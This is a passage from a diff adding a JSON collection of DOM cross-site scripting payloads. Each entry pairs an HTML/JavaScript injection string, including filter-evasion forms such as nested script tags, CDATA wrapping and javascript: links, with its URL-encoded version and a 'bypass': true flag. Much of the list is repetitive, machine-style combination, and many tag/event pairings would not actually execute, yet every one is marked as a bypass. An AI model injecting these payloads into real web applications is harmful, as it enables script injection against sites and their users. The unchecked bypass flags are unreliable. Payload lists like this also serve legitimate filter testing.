+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003econfirm(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Econfirm%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:confirm(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aconfirm%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003econfirm(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Econfirm%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:confirm(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aconfirm%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=confirm(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dconfirm%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003econfirm(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Econfirm%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003econfirm(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Econfirm%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onload=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onload%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onload=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onload%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onload=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onload%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onload=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onload%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onload=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onload%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onclick=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onclick%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onclick=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onclick%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onclick=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onclick%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onclick=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onclick%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onclick=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onclick%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onfocus=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onfocus%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onfocus=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onfocus%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onfocus=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onfocus%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onfocus=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onfocus%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onfocus=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onfocus%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003eprompt(2)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Eprompt%282%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x ontoggle=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+ontoggle%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg ontoggle=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+ontoggle%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:prompt(2)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aprompt%282%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody ontoggle=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+ontoggle%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003eprompt(2)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Eprompt%282%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus ontoggle=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+ontoggle%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:prompt(2)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aprompt%282%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open ontoggle=prompt(2)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+ontoggle%3Dprompt%282%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003eprompt(2)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Eprompt%282%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003eprompt(2)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3Cscript%3Eprompt%282%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fdesc%3E%3C%2Fsvg%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscript\u003ealert(3)\u003c/script\u003e",
+      "bypass": true,
+      "encoded": "%3Cscript%3Ealert%283%29%3C%2Fscript%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cimg src=x onerror=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cimg+src%3Dx+onerror%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg onerror=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Csvg+onerror%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ca href=\"javascript:alert(3)\"\u003eclick\u003c/a\u003e",
+      "bypass": true,
+      "encoded": "%3Ca+href%3D%22javascript%3Aalert%283%29%22%3Eclick%3C%2Fa%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cbody onerror=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cbody+onerror%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003ciframe srcdoc=\"\u003cscript\u003ealert(3)\u003c/script\u003e\"\u003e\u003c/iframe\u003e",
+      "bypass": true,
+      "encoded": "%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%283%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cinput autofocus onerror=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cinput+autofocus+onerror%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cmath href=\"javascript:alert(3)\"\u003eCLICK\u003c/math\u003e",
+      "bypass": true,
+      "encoded": "%3Cmath+href%3D%22javascript%3Aalert%283%29%22%3ECLICK%3C%2Fmath%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cdetails open onerror=alert(3)\u003e",
+      "bypass": true,
+      "encoded": "%3Cdetails+open+onerror%3Dalert%283%29%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003cscr\u003cscript\u003eipt\u003ealert(3)\u003c/scr\u003c/script\u003eipt\u003e",
+      "bypass": true,
+      "encoded": "%3Cscr%3Cscript%3Eipt%3Ealert%283%29%3C%2Fscr%3C%2Fscript%3Eipt%3E"
+    },
+    {
+      "type": "DOM",
+      "payload": "\u003csvg\u003e\u003cdesc\u003e\u003c![CDATA[\u003cscript\u003ealert(3)\u003c/script\u003e]]\u003e\u003c/desc\u003e\u003c/svg\u003e",
+      "bypass": true,
